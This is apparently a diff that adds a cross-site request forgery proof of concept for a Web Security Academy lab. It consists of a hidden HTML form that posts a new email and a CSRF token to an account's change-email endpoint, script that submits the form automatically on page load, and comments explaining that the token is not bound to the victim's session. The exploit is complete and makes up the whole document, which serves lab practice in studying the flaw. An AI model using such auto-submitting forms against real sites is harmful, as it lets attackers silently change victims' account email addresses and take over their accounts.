@@ -1,0 +1,11 @@
+<form method="POST" action="https://0a3e00f703b1eb648041f332007500fa.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="victim@user.net">
+    <input type="hidden" name="csrf" value="BN543fVXFq0o4XWkKyrvPk505OcmPNzC">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+//the csrf token value changes every time when we reload the page so we can change another one email by using our csrf new value.
+// thats becauuse the csrf token is not associated to any session.
